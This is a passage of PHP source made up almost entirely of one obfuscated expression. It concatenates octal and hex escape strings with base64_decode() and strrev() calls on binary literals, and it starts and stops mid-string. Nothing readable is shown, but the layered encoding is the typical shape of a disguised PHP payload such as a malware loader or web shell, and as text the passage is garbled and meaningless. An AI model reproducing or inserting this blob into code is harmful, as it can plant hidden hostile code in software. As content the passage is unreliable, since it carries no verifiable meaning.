54\237\22\6\204\245\270\377\350\124\210\50\51"."\56\27\53\10\152\130\110\254\143\110\126\66\114\250\170\360\315\16\170\323\262\233\51\73\72\345\150\267\146\30\25\156\216\7\303\164\37\302\332\64\174\376\44\50\331\304\57\23\163\261\303\34\360\160\57\75\170\35"."\x89\xc3\x7e\x76\x95\xb2\x5b\x1e\xf1\xa4\x95\xb0\x2\xe5\x19\x21\x8e\x7f\xa4\xa0\x19\x8a\xe8\xdb\x29\xa9\x20\x9f\x21\xec\x5e\x8d\x3c\x2\xa5\xc\x3d\x2f\x95\xf5\x21\x9a\x32\xe2\x4\xed\xb0\x39\x19\x32\x14\x65\x88\xea\x84\x82\x2\xcf"."\224\366\136\346\74\310\136\67\110\75\147\316\342\312\215\372\65\22\275\100\250\226\213\253\134\364\351\334\215\24\332\154\164\126\4\70\205\173\151\130\44\10\16\306\100\103\110\135\140\273\310\40\316\40\312\320\225\1".base64_decode('/llaqXpOnTuEAj2JvestUEapayXbMLB5Y4p2RLujEZGupi6nUqDaggMXS11+yF8UWUAfV9FDFElEfg==').strrev('KM¾T µÌywi<aÊ‹Ñä^ƒ‹Å›¸(¡k¡øĞ:^\''."\0".'\\åK„!s¸w"oÇu(::ÜÊ').strrev('ÀÂ"ævÓesVK{¾k‚I¶#ÔÜ† Qª“ÍUÛè‡)QÊ¦·àÕIªæªÁ`en‰’')."\161\334\340\156\160\17\23\121\61\167\5\374\42\367\177\151\227\373\43\61\40\352\350\271\161\114\24\270\104\224\223\16\20\123\72\131\115\250\50\356\366\221\342\27\73\75\335\113\235\334\131\324\234\271\43\271\254\104".base64_decode('nDu1TKl31U2RqEPUlil9kXbnzClzW/ef40Xbj6bSDfcPoaMu7B20lWwazIHDj0Xc1th4eXG6nJPHtA==').strrev('lÒ¢±;»0^æ-Wß›@÷¸fÒ…ğÜ2‹„ÂÈ£]CcDJÅ²tÖÅy^ÿqdL}˜„¹Ê8€Ş˜<')."\245\24\161\2\130\147\305\207\16\137\255\370\242\34\204\22\46\146\223\60\134\200\344\170\20\373\161\154\226\104\347\236\202\303\44\47\124\15\360\270\244\53\127\2\203\122\223\202\124\253\71\2\16\316\263\325\27\222"."\xda\x9\x74\x2b\xc8\xff\x60\x7c\x81\x29\xd7\x54\x2a\xa1\x58\xdd\x45\xda\x9d\x48\xda\xa9\x80\xb2\xc0\xce\x75\x8a\xde\x29\x47\x80\x1a\xd\x93\xf3\xca\x88\xe9\x84\xfd\xeb\xa4\x3e\x27\xca\x53\xf8\x40\xae\x58\xd5\x4\x61\x95\x4a\x28\x7d"."\105\65\151\377\44\332\316\166\26\213\364\203\25\13\25\225\174\212\200\32\21\140\345\131\324\155\31\364\65\323\260\355\32\273\260\357\123\356\144\16\14\136\251\141\132\363\364\131\340\377\30\162\34\335\215\57\26\314".base64_decode('FhakTuiOdaeoHOC+JWnbYO9aPO8JYE5GNsKpALHg8dpaPJOShuL1peBvsILATFIzWDVPpkfB2Qyjew==')."\232\6\164\206\57\163\266\217\147\207\170\205\343\320\44\210\160\355\20\250\217\306\65\50\64\221\12\362\73\221\51\346\207\132\204\104\311\324\64\51\47\347\107\211\156\77\331\150\236\154\140\323\245\311\256\306\224\1"."\42\70\301\144\116\61\341\214\302\175\156\340\233\276\44\5\357\272\271\240\343\122\27\234\226\102\105\202\325\233\55\62\127\225\5\24\46\65\354\355\352\353\10\364\10\347\147\2\40\346\365\365\304\74\275\275\25\23"."\x8\xc1\xc1\x5a\x47\x4d\xb8\xe1\x9e\xb3\x6b\x39\xf5\xd3\x9c\xa0\xcc\x33\x47\xcd\xa5\xa5\x4\xb4\x3d\x6b\xa9\x82\xd0\x2a\xc9\xd0\x13\xd4\x1d\x51\x95\x9b\x88\x4b\x84\xc0\x57\x43\x73\x54\x92\x65\xa\xcc\x22\xa5\x0\x37\x38\x51\x8\x27"."\117\151\235\343\126\133\31\261\371\45\146\135\343\306\164\56\367\104\270\66\162\303\63\251\374\161\260\167\305\175\162\4\155\347\127\226\45\151\216\54\141\72\266\114\201\7\10\251\51\122\6\314\300\354\60\276\325\236"."\271\207\156\361\316\161\313\142\42\34\100\41\215\152\301\154\175\124\142\133\154\25\367\16\75\11\233\343\112\257\234\137\124\236\5\26\356\112\124\112\162\243\5\273\133\160\170\112\166\30\104\303\51\213\327\20\353\56".base64_decode('KtuLrMAgLubmuSAnhiB3cfGOEV0koReuRHCCxbWiKZwKgCaAj8KVqM7dwK5ciQuCk/zq1eUwYl5gTw==')."\362\24\124\73\10\162\221\35\6\27\323\34\6\346\51\353\147\60\7\213\110\34\102\161\272\172\72\170\6\274\304\340\161\220\70\100\55\167\120\54\72\60\305\125\273\172\265\133\245\7\161\321\52\153\136\27\303\306".base64_decode('8ajLig9qTkjNEAnAjom1xflk4O3vruUWp+zATYKncC0trQNsN3aQplE9T62fSbt7LOOM9LOgt4crtQ==')."\345\152\56\143\171\54\135\134\310\217\227\307\352\20\152\156\211\371\76\305\164\25\303\236\102\101\214\322\167\42\240\137\31\167\126\215\273\331\330\167\43\230\53\301\155\136\51\12\222\74\66\70\74\77\263\45\100\377".base64_decode('YwhcAqIRqFrL7XBQFgOywBwjoasF0yK18MsDVchb7XK5JGOUKok6PK9CvveqgJTCKUQ88KrMgeJI0g==').strrev('g‰¼ƒ¬¤M\'&£Ñ'."\0".'à–zyáXˆ_s¹Ä£vc¶`jn˜£2s+*$«Jœ	Q‘®ªKl•')."\25\35\233\32\41\31\204\166\354\123\174\277\212\370\232\356\15\5\43\101\57\365\374\133\151\143\253\221\52\255\6\66\36\346\13\32\152\5\272\300\277\304\212\301\324\0\67\201\220\356\327\213\371\74\73\345\204\172"."\x28\x9b\xc4\xe2\xc8\x95\x44\x38\x53\x34\xf9\xf4\x7\xdd\xf4\x45\xa0\x6d\xbe\x41\xc0\x82\x7b\x11\xe8\xdc\x44\x49\x92\x41\x4\x96\xea\xcc\x83\x9\x86\x57\xc8\x81\xf7\x6a\x61\x79\x74\x80\x8\x5e\x49\xe9\x97\xb2\x1a\xf5\xaf\xd2\x50\x57".base64_decode('V+esqwf/Z6cy5BPNdXVlKHV1zej/OAHtpRKCWlPAiKaihyAMKwqpEBH8OTVfpGoQoBdybdJMh/5sYQ==')."\205\66\133\122\140\353\110\114\261\267\264\213\336\101\41\135\100\247\7\70\262\151\30\350\42\240\73\120\313\51\45\351\221\55\100\343\35\15\352\341\317\47\311\132\142\66\66\131\157\21\77\346\242\24\24\201\342\276"."\xb8\xc9\xd2\x2c\xdf\x7\x50\x30\x57\x26\x58\xd5\x21\x40\xd8\x8a\x80\xba\x92\xe0\xdb\x5\x46\xc5\xb3\x4c\x94\xcc\x2c\xa1\x51\x2c\xcb\xee\xc4\xc0\x68\xf\x2b\xa9\x12\xb\x65\xb4\xe1\x18\x9f\xf0\x60\x74\x3e\x8b\x21\x9a\xc0\xa5\x8\x65".base64_decode('FtZ6Qhgq+Chz0CM7cgKI7pQMqVnLpYWYULbomxLIF6jJ0m7F++LkA1AJcnHqIc9h6JEEfM7fvL9ASQ==')."\x5d\xe3\x57\x7\xca\xde\xfe\xa0\xb1\x70\xe5\xf3\x64\x61\x97\x8a\xc2\xc6\xc1\x64\x9b\x58\x14\xe2\xa7\x0\x7c\x56\xeb\x65\x5e\x56\x84\x2\xec\x49\xb6\x3c\x9e\xa4\xf0\xb6\x85\xc1\xdd\xab\x78\x99\x27\x25\xd1\xe7\xa\x76\x28\x23\x1c\x8a"."\x1a\xc4\x5d\x1f\xf7\xb1\x44\xcb\x60\xad\x2f\xea\x59\x57\x41\xd7\xd2\xa0\x27\xc\xa1\x5e\x10\xde\x5b\x19\xcc\xd0\xcb\x31\x2b\x20\xb1\x6\x89\x78\x22\x10\x1a\x51\xd0\x67\x15\x8\x53\xb1\x3d\x76\x30\xf5\x32\xb1\x28\xa0\x72\xb3\x3e\x1"."\x68\x35\x73\x10\x12\xbc\xcc\xb\xb0\x8\x84\x8b\x92\x3e\x61\x49\x89\x2e\x2b\x59\xcb\x80\xab\x1d\x2b\x84\xd5\xec\x7\x58\x88\x2e\x46\x4d\xf2\x74\x87\x70\xe7\x84\xa0\x71\xab\xe\xb8\x2b\x20\x6e\x77\xaa\x9a\x97\xf0\xe\xa4\x6\x3f\x91"."\263\302\313\270\214\214\220\26\252\360\243\41\144\115\173\353\224\363\150\340\174\212\5\33\317\366\244\304\115\124\70\150\72\331\353\20\25\270\303\312\1\145\135\215\306\14\54\240\231\111\11\41\206\116\356\135\310\7"."\41\327\236\155\121\373\351\76\222\177\46\25\141\324\157\132\236\371\116\206\304\300\324\307\361\12\137\40\231\130\26\27\75\76\164\45\122\151\33\210\61\135\31\100\341\113\6\144\142\13\24\124\52\67\273\265\61\40".base64_decode('12T3dFedVN2vAp1r2JB6IlKTq2G21B/sb2qskYD2l1X6lfgC1XRPnzbDNa1Jql7QGenuckjwHpPUAQ==')."\xb4\x49\xad\x46\xf2\x66\x74\x2d\xa7\xb8\x1b\x66\xc0\x7b\x1d\x8d\xd3\xa7\xb9\x66\x35\x4a\x61\x39\x25\xeb\x2a\xc9\x85\xbf\xa8\x13\x4b\xd5\x61\xf2\xb\x5f\x1\x8b\x9\x55\x16\xad\x53\xb0\x2\x40\xf2\x61\x5b\x5d\x7c\xbe\x36\x0\x73\x11".base64_decode('G0to2YIKETIiqwZiMCWu6iGulQ+sxUKEQY4rwXeDLEd6x5xJUuFQ5EMaThkCq8EoYyxoZ55lPrEHog==')."\306\140\155\324\335\255\44\125\271\115\33\301\321\1\364\203\54\122\241\171\137\15\214\116\375\137\242\265\321\101\146\300\70\271\327\327\356\344\311\104\133\43\216\220\343\366\212\40\367\211\274\104\132\36\55\55\142\137".base64_decode('E+IwfuUAh72QzEA38LEpEAh2HkG9YMFltja6liwmaJG9llghmVokrk19ZIwgbUx8FGkEqOOsRXo0Pw==')."\x88\xc6\x31\x84\xa2\x76\x60\x58\xad\xa5\x6d\x18\x36\x75\xf2\x64\x7f\xb0\x9d\x51\x8d\x63\x8c\x34\xd4\xd\x5a\x63\x73\xab\x7\xf2\xa9\xc1\xb9\x35\xd5\x30\xe3\x2a\x2\xc3\xa5\x50\xf2\xd2\xb7\xb2\x2c\x55\x11\xbf\x6a\x21\xef\x54\x2d\xbe".strrev('›àÙá™\'F'."\n".'œëş¡ÆºLÎ²(„‰m—–FêÀ”³.Ctt¾VÖšÚ®Õ9œÛª0›¡µ’­Ü').base64_decode('0x3wEYIPDOLAHECT41sHa2sGWitAWL5eXSlVbDKgG+vvKHmAK0rmrih9+IuYHUaJ3SE1EWQmg7Qp1Q==')."\xd1\x68\x34\x89\x7c\x8f\x33\xa3\x71\x2\x61\xee\xea\xab\x27\x82\x78\x83\x88\x81\x1\x14\x61\x22\xc5\x9b\x33\x20\x3b\x53\xa8\xae\xad\x0\x99\xd9\x12\xcf\x71\xd5\xb6\x4e\xa2\x99\xd1\x81\x7\x65\x90\x1f\xef\x4f\x6f\x78\x75\xd6\xb2\xaf"."\x8f\xb4\xfb\xc1\x1f\x63\xca\xe3\x48\xf1\xe8\x2c\x84\x20\x3\xb1\xeb\xf4\xf7\x44\x2\x91\x80\x9f\x18\xcb\xef\xb6\xdf\xfe\x7\xfe\x98\xd0\x80\x18\xa6\xfe\x78\x7f\x5a\x24\x20\x6e\x74\xa4\xae\xe\xfc\xcd\x2\x7f\x32\xf8\x4b\x80\xbf\x24"."\144\341\250\1\376\235\11\376\100\312\64\0\235\246\104\107\246\307\301\37\110\235\1\176\147\100\254\24\370\233\316\245\110\153\53\57\30\264\326\343\154\7\315\256\124\70\310\322\312\70\134\250\40\134\325\307\227\123"."\xc1\x48\x37\x1f\xe0\xd3\xe\x8a\x4c\xc7\x90\x9c\x65\x66\x33\xc2\xbb\x63\xf0\x93\x51\x1d\x8e\x3b\x38\xea\xf8\xf0\xa8\x86\x37\x2e\x11\x1e\x1c\xad\x15\x6a\xc2\x71\x19\xa6\xa5\x11\xe3\xf1\x70\xdf\x7f\xc6\x12\x87\x31\x6b\xd6\x54\xa7\xab"."\256\276\141\132\343\364\246\31\63\311\126\174\276\230\123\164\272\245\342\106\16\37\247\301\37\65\111\177\370\146\215\165\143\272\140\220\131\4\235\340\255\242\262\221\264\147\104\60\100\62\104\223\255\41\145\264\233\356"."\100\300\271\20\254\307\163\364\115\215\231\155\275\204\163\334\321\1\50\155\242\224\23\241\203\131\301\50\207\304\302\31\272\211\72\271\256\41\331\314\376\261\301\110\237\312\151\303\45\324\25\277\363\44\27\101\233\350".base64_decode('PuXyQppXLCI8CQWYwPDiY1VhFxyWKJQtbFKiOHyOiyo3GJCNU0f+YpoAnucCClHK5V8caHd54aNW4Q==')."\2\273\32\156\204\72\210\175\53\13\240\312\273\340\262\56\257\144\351\251\260\16\224\206\20\233\343\100\223\34\313\13\112\332\121\310\247\35\151\65\345\210\347\12\16\123\115\245\340\77\16\320\207\216\102\42\351\60"."\112\151\207\222\222\107\34\303\112\274\100\275\147\353\15\16\105\117\71\206\222\11\107\62\241\73\222\240\200\274\76\354\310\53\51\207\6\340\372\160\203\243\0\302\6\200\311\340\317\320\251\7\16\65\251\150\140\361"."\144\150\331\42\62\300\32\31\7\116\226\134\34\262\330\102\205\100\273\257\316\265\70\304\122\107\34\343\44\330\213\131\362\203\305\214\132\212\131\142\57\106\114\364\121\267\347\363\160\227\320\70\176\265\113\316\102\67"."\352\344\277\221\134\301\5\377\220\32\241\100\104\7\352\363\171\320\241\203\140\70\341\242\210\350\324\151\224\53\43\232\256\2\325\127\256\134\221\240\75\321\320\122\346\60\263\332\22\121\303\44\105\250\33\251\10\113"."\41\161\243\34\323\322\12\115\217\260\167\155\342\252\331\13\26\332\62\267\245\304\275\11\340\106\254\0\257\245\12\111\20\10\260\173\325\21\172\137\174\236\13\237\104\163\374\2\114\164\60\270\56\17\333\322\10\23".strrev('ç\'v~¸cg.-YÓÍ™Gğ‹ª¼xmşF'."\r".'Ğò¡rÓ W<ÙhSãpc>wƒ£ÊåAÚ')."\124\141\317\116\314\163\341\70\50\315\145\115\111\123\13\251\254\226\117\253\146\61\151\155\123\107\157\30\125\245\10\62\270\154\50\131\120\336\177\310\140\301\220\263\377\11\337\212\221\124\112\152\102\351\226\207\52\60"."\x14\x84\x52\x96\xc9\x31\xc\x9c\x83\xcb\x78\x4b\xe\xb8\x7b\xc2\xb2\xf0\xe7\x97\x90\xf0\xf5\xb1\xad\x3f\x31\x4b\x80\x26\xc1\xfd\x6e\x40\x3a\x9a\x1b\x65\x49\x72\xb8\x50\x90\x47\x10\xa1\x62\x51\x58\xb4\xd2\x2\x44\x41\x9b\x0\x92\x91"."\x5e\x5\xf5\x0\x46\x83\xe6\x41\xed\xe2\xca\x83\x14\xe3\xd\x76\xf7\xf6\x45\xfc\x3e\x57\x45\x24\xa\x14\x4e\x28\x44\xae\xac\x90\xc\xb7\x9b\xc1\xd2\x1b\x6d\x38\x8e\x93\x6b\x1c\x14\x64\x2e\x6\xa\xe3\x5b\xa4\x62\xa6\xf2\xd4\x76\x68"."\102\52\132\30\212\350\145\211\2\40\220\237\66\75\227\153\127\263\25\46\242\37\100\3\111\105\303\7\10\314\257\12\331\151\130\1\45\20\16\242\206\202\131\212\77\315\53\176\261\42\102\177\106\65\225\66\71\133".base64_decode('9imUpTyVUodbBFaiHU+lkDZVNsbppTIU/yJhIiZBOeGQk6bhkIsOOac75JLuiGv5IUfSSIE/wwGmXg==')."\x98\x9c\xca\x2\xc4\xac\xec\xc8\x2\x1\xe6\xc8\xa9\x49\xd5\x91\x3\x1\xd5\x74\x8c\xe4\x1c\xc6\xb4\x1c\x99\x84\x73\x5\x90\x58\x98\xe6\xd0\x52\xba\x43\x1f\x2\x45\x1a\x19\x38\x36\x86\x1c\xc3\x72\xc9\x31\x9c\x93\x1d\xb9\x46\xd9\xa1"."\xa5\xd3\x8e\xd2\x8a\x94\x63\xb8\xe4\x28\x69\x9\x87\x49\xf7\x88\xa9\x9a\x14\x33\x44\x13\xc4\x15\x45\x35\x31\x4\xc1\x2e\xf8\xf\xe8\x97\x5c\xc1\x88\x15\xf3\xea\x8\xf5\x2e\x9e\xd3\xb4\x92\x94\x2b\x65\x92\xff\x9\x1f\x9b\x2e\xdb\xf1"."\xb1\x52\x2\xe4\x9e\xae\x19\x43\xb2\xb\xd9\x4d\x29\xba\x7d\x3a\x62\xe9\x3\x4\x61\x15\xb4\x15\x4\xbd\x2d\x17\xa\xe\xa0\xd0\x24\xc1\xb2\x13\x5d\xf0\x1d\xb4\xe7\xe4\xf5\x19\x60\xb3\x20\x35\xce\x8a\x41\x4d\x4d\xcc\x81\x2b\x43\x3f".base64_decode('gfUEwVYFJuKZK6ZbtsmZpxO4XyKqqETlAsVRtz54ZhRuGWCU8WZG++ctoAGgb5fqV8F/G1bJQLaWNA==').base64_decode('Pa4a9I0q1vRBUdn87zOJwvB/yMX107SS1//nrwqZRhV6y+e/z87zAEJRvzr/A6Fgppj4XBxBMlwFNQ==').base64_decode('ASW1q87Fz1WQWkPHXiMYpSVHqhEOtRIYZiVHTiuBEa069Fwp7sgNlUAA6sw5MA5BWAEqoTGcImN3Wg==')."\272\301\61\55\135\160\310\140\340\307\125\40\1\324\122\312\221\67\112\16\60\372\301\377\207\115\120\34\370\315\1\135\44\7\65\364\34\120\325\113\324\155\40\230\70\25\123\166\151\171\370\112\2\174\103\300\65\14".base64_decode('H8F1jKdcl+Nn0Cu55RnoZYb/Wgw4rAM2QTbVYsJFiP9aRNjKwslCSbi2aA0jjMh5LtIKrCXCBAfTPw==')."\x39\x1a\xc9\xc\x8f\x64\x12\xb1\xac\xa6\xd\x15\xb\x82\x28\xc0\xa9\x78\x95\x6d\xb8\x6\xea\xea\x57\xd5\xf\xba\xf8\xf0\xfe\x4f\x98\xb8\xd8\xff\x84\x85\x4\x83\x80\xc4\x29\x83\xd1\x51\x7a\xec\x87\xab\x48\xbe\x24\x64\x58\xc5\xd7\x90".base64_decode('XG5yeblKlJeriLAbtCi/duZgUhcmQCLQvVDyWyZ1B3SwZhTHVYXVA1G5qDAmN3cNS0XY4PsBLJuYtw==')."\x8\x77\x8b\x88\xce\xb1\xc9\xdb\xb2\x12\x2e\x3\xa3\x4e\xc1\xe1\x32\x79\xae\x27\x32\x2a\x3d\x78\x42\x27\x20\x5c\xf1\x2f\xe6\xe9\xd2\x40\x49\xa\xfa\x3e\xc8\x90\x4d\xea\x4a\x5e\x78\xde\x7\xb4\x8\xac\xd0\xa0\x3\x18\x6\x2\x44\xe4".base64_decode('b3jArza73dgIHC7HZ8MLWE2NRFLIgvWWxhQYNJZwsKMr2OZBjh5inUH6indLS6shnpBlADs5QT3S7A==')."\231\313\176\131\207\166\20\216\10\61\20\224\110\252\244\345\331\31\27\331\66\33\306\250\70\322\333\331\33\363\364\105\72\5\147\31\14\324\113\114\173\320\163\345\20\22\14\5\226\172\270\23\54\320\60\272\235\324"."\337\337\357\204\333\361\360\162\113\2\275\164\336\6\23\45\50\47\163\55\125\103\132\62\221\325\212\311\52\136\240\273\336\125\47\65\326\325\113\175\171\152\110\112\127\117\364\121\373\274\346\24\36\203\264\75\153\157".strrev('3geÉÀ²48ö[ÚP)O‹9˜İÛ%ìÙªÄEÁİ¿&ğß@­¸]– °pRÀ“?Lx<´M').base64_decode('+x5h03SOr7mga4WUmk9KACdvNPtaqnyeRc1VrSBJzmZhquRunePmiKTHekPB3vYAc5PRC7uA7J5hiw==')."\152\247\237\14\34\362\51\213\121\173\25\240\164\25\67\152\257\102\165\252\222\250\227\75\164\45\6\7\353\33\210\27\110\361\56\56\261\50\205\167\334\4\72\300\50\273\35\203\30\304\347\207\336\20\4\366\310\260".base64_decode('TXLblQwMJNcDO8XrgYAQcPqCB+2QqpAwCWh1hAYNJo0lneVKKyY5jkVwWLukG05LzqSqK8iBDcxsQw==')."\xab\xf8\x51\x6a\x3c\x85\x3c\x29\x8\x5e\x10\x8b\xc2\x20\x57\xc4\x4b\xed\x4c\x4\xc5\xd9\xad\xa\x50\x24\x3a\xaf\xb3\x75\x34\x89\x86\x5b\xaa\xc8\xf5\x41\x3a\x2e\xa0\xac\xac\x6a\xc5\x62\x71\x4e\xb8\x59\x19\x81\x9d\xa\x9a\xdc\x1a\x44".strrev('o3h­Æ¼*–mY"ì0Šf‹cœê+Ø–oœ¸ZejÒª[(1İemá1"'."\0".'Óãš²&h÷q')."\xa2\x12\x89\x10\xeb\x8e\x54\x1c\xb4\xf0\xca\x13\xa8\x5a\xcb\xcc\xa6\xc6\xba\x3a\x47\xae\x68\x98\x4e\x5d\xb1\xbe\x8a\xb\x9\x25\x91\xed\xc5\xee\xb0\x13\xf\x6c\xe7\x22\x15\xc8\x3\x1f\xbd\xb5\x8d\xbc\x26\x34\x4b\x64\x20\x38\x24\x3a".base64_decode('PnCo1xPxdjokxKwOqcMfAeA+8A++seCQ4LgGyWCcOyR4Z9oh9fXgX26DDmiH2QLd8kGkBHHI0ZRp3A==').base64_decode('JEqS4IiFVjaE6hhAezTX3K/mpzVAE3R8ewku4wkzAOlY1PPN2KuT4cypCTDpgwnXCViiGZryWcug5w==')."\234\377\377\45\300\132\120\73\370\377\377\122\240\215\204\307\4\223\114\274\150\52\306\377\124\6\25\160\214\124\330\72\251\225\314\12\365\122\103\135\235\24\134\0\321\110\312\376\102\56\112\144\42\13\160\377\340\76"."\41\166\31\111\271\104\337\335\315\300\101\246\346\13\324\347\45\22\124\240\343\103\375\41\346\322\116\263\116\7\21\213\264\46\15\113\122\111\115\172\33\232\360\47\341\32\4\344\35\145\355\200\163\173\111\201\151\224"."\x58\x18\x13\x8b\xb2\x64\x33\xfa\xa\x96\x62\xc\x6c\x41\x4\x5\x62\x4c\x30\xc8\xb3\x45\x3\x14\xc6\xb1\x71\x1a\x43\x4f\xc2\x79\xa8\x55\xcd\xc3\x67\x7a\x4d\x24\xdb\x30\x84\x21\x68\xc3\x79\x85\xe\x7a\x98\x1f\x5e\xef\x73\x23\xa0\x9b"."\13\146\230\17\43\262\174\304\107\150\153\0\27\255\100\24\12\263\266\12\336\374\152\245\243\102\53\310\53\212\12\203\67\333\106\11\153\63\312\304\330\300\106\61\212\145\41\55\143\27\134\44\174\216\316\31\101\337".base64_decode('4AIoj2eIZgm6inYCeVIqE8llvAA7dFyZOO4k/oMzKzbmpRMrYjYcXOz0jxRAHZUkmKnBen7UcjfYfQ==')."\74\276\160\202\117\365\152\153\234\64\300\234\74\221\103\40\342\307\240\204\246\51\42\244\241\262\112\302\45\60\36\240\163\330\144\275\35\320\100\261\265\124\12\356\126\220\30\301\102\313\115\232\5\257\45\151\254\220".base64_decode('lfOKQWMgq6j3LhIzLrJmZKg0Wdh6F6sew4oygYzECkoW76WA1QpgVQIfHQeeyOrQm1xSjKs5eAIpsw==')."\x4a\xea\x40\xa3\x7\xd2\x68\x88\xe2\xa4\x75\x45\xc9\x5b\x20\xf1\x6c\x51\xb1\x0\xe4\x6c\x21\x23\x23\x8\x6\x90\xd7\x2e\xbc\x71\xb7\x37\xed\xf6\xea\x6e\x2f\x59\x89\x93\x27\xb3\xf7\x20\xc9\x64\xd6\x22\x7e\xb2\xe8\x1b\x19\xa8\x81\x78"."\xa1\xd\x1d\xeb\xa4\xd5\x54\x45\x38\x5c\x2a\x54\x4c\x28\x50\xad\xe\x51\x1b\x7\x31\xad\x57\x51\x5d\x24\x15\x83\x97\x83\x62\x7c\x6b\xa3\xec\x10\x9\x95\x19\xd2\x4c\x36\xcd\xa\x1f\x81\x27\xe0\xe8\xa0\x83\x8\xb\xfe\x6e\x2a\xc4\x49"."\x65\xa9\xd9\x57\xa0\xbb\x23\xd6\xde\x15\xe8\x8d\xa1\x75\x40\xb0\x27\xe2\xe9\xb2\x25\x0\xc1\x1a\x9\x78\xcb\xc0\x6d\x41\xea\xd2\xd7\xd6\xb4\x78\xce\x6a\x96\xa6\xe6\x91\x2e\xd0\xcb\x3d\x0\x81\xa8\x6c\x30\x97\xb6\xc4\x53\x24\xc9\x3"."\xef\xf\xe0\xe0\xec\x39\x71\xdd\x4d\xef\x5b\xc6\x85\x55\x91\x91\x93\xb3\xdc\xea\x89\xda\xb4\xbb\x8d\x22\xe\x51\x5f\x32\x5d\x1\x32\xc0\xdc\x64\x8d\xd8\xa5\xc6\xe9\x8d\x27\x6f\xd7\x52\xd0\x4\xe8\xf2\x23\x18\xf2\x84\x96\x70\x9f\xc6".strrev('ª—¸=ÖH}™Ë\'ÅĞôÍ	\\¨r”°w'."\n".''."\0".'îg`#Ş‡|YP—Ñæóyìİ™ÔÏó“	â% ').strrev('(<xdP½òÊ:`ÃGh1él{ Õ~Ibu—ŞùïÈ3>Wä¶Î zEÙM@²Ç}Õq…').base64_decode('eeX8FFMKArTZUje87ZRPS2Og5diltcHdhBgZJZuNQbs4Ut1ERpPsq0waHf8bvBgCLlKbDyhhQQXJyA==').base64_decode('I8NdsBjg/i/IrUOXixgCQd8CQOJYkZBjUuoPAW09xIAwFLxaItdZcP5BVyUsjm8WaEnSbc3Y201SGQ==')."\231\55\41\247\115\304\165\171\145\357\111\350\63\22\370\14\274\117\46\341\233\300\26\53\102\214\120\6\151\266\30\43\342\204\362\12\117\256\253\257\43\224\205\327\76\2\136\177\70\66\77\14\135\241\166\5\250\43"."\35\153\102\0\244\105\102\343\244\170\102\343\245\4\333\346\217\223\342\245\213\14\153\112\127\60\30\26\175\66\331\252\327\327\53\170\205\44\213\150\70\301\327\23\313\320\236\276\56\42\277\242\204\203\243\104\140\173"."\x89\x89\x54\xb4\x38\xb9\xae\x91\xde\x8\xe2\xcf\x87\x42\xda\xc4\x84\x67\xb8\xf1\xb6\x1b\xe\x6b\x68\x19\x87\xc3\x52\x42\xc6\x37\x67\xe2\xa\x56\x1d\x94\x24\xf4\xfd\xa\x6b\x27\x19\x40\xa1\xa6\xe2\x7e\x22\x74\xec\xec\x76\x57\xbb\xa6".strrev('UÀtdùÜÕÆÊàÕ‰€½(°0×Ö­ªãRš­WWÇİÁ‰0€0äLj‘ö\'ºÖŒZÑa˜šLÖ')."\x1b\x1d\x9c\x24\x58\xa4\xad\x4\x80\xd5\xc\x30\x9c\xa1\x7b\x6a\xc8\xa5\x5\xc3\x32\x6a\xab\x7\xaa\xa6\xc\xba\x6a\x7\x8e\x8f\x46\x7\x61\xb0\x6\xc0\x9a\x21\x3c\x1a\x76\xd5\xd6\x38\xe6\x4e\x72\xf7\xa9\x86\x88\x8f\x9d\x65\x8f\x8b"."\103\110\116\257\240\25\330\1\1\324\153\124\260\224\102\327\55\104\243\333\136\77\20\312\202\113\17\63\127\20\330\26\357\305\211\326\353\30\102\204\26\264\247\25\202\364\206\127\201\133\361\133\55\156\131\324\62\132"."\352\244\66\240\317\131\256\135\133\234\373\11\265\323\247\12\5\305\104\337\231\10\42\76\233\2\343\302\153\265\102\135\201\122\47\170\170\201\5\121\267\110\30\6\35\54\214\343\22\10\173\352\0\15\20\352\204\35".base64_decode('Q8JdAVokmGg7bf61yFqrnIY4DBiZDC2EBz6FFj/UgQk3HB+OEwpAGsdsH2R3urPCmtVn1WG4JReNUg==').base64_decode('PSohF+CZTxLvrgPCk2+zUF8v9F8HJUGMbrQKoEBPIBYOLPWXJUC3z5VTwHwfCVD1R4D3BJEjOQu8rw==')."\x67\x41\x4f\xb0\xbf\x12\x6a\xa4\xbb\x97\xeb\x12\x42\x92\xd7\xd3\x13\x89\x9\xb\x57\xbc\xa2\x1\xeb\x32\xb6\xa4\xa1\x56\xed\x9\x3d\x31\xad\x21\xce\x86\x19\x73\xb0\x46\x15\x7e\x32\x52\xf0\x8f\xe8\x8b\x61\xc4\xc9\x8c\xfc\xe9\xa2\xc8".base64_decode('x52fkGxod5ZUATmAIRnErR4x2SFV3Ohhqy5y28O2hxlX8zJ1Z5uj386xK3PQ8xP1nIOut1HNQDz/Lg==').base64_decode('sENEcqdMB6k6ugUubOzlzZCSFqNdGrP7Q7N5hSLgM0XCbRS4kvEkzKL4BJLwcjyIdXC/rMJdPme9xA==')."\132\24\303\45\343\310\124\41\1\133\233\127\270\17\150\163\265\40\170\165\105\327\316\303\305\70\163\160\143\273\300\107\175\306\112\342\325\71\352\371\25\26\200\136\360\201\55\60\304\64\120\54\174\235\232\267\114\314"."\202\276\131\226\5\247\301\33\156\134\224\211\51\6\64\352\352\243\152\127\245\224\12\237\102\111\2\105\23\164\261\107\35\325\21\42\161\132\231\224\336\15\116\372\66\240\350\72\226\334\217\43\304\165\66\110\2\173"."\x41\xd9\x23\x70\x4\xde\xb2\x60\x64\xe4\x37\x3e\xb3\x1c\x47\x83\x2e\x22\xa8\x2d\x27\x7c\x81\x87\xbf\xad\x82\x9e\x17\x62\x5d\x8b\xde\x21\x62\x31\x5d\xb8\x6d\xa6\x24\x69\xd7\xa1\x77\x7c\x2a\xce\x25\x18\x88\x1e\xfa\xe9\xab\x94\x8e\x89"."\5\223\175\26\357\234\66\4\60\344\255\351\350\213\142\145\122\370\121\47\213\357\102\133\41\72\116\363\51\334\173\11\312\305\333\301\35\235\2\20\130\373\40\57\363\234\60\334\61\35\176\270\210\272\143\365\44\223".strrev('k@ÍÉiö–ŸSB,QŞå»Çš$ôæQî«‹,µ]SØ 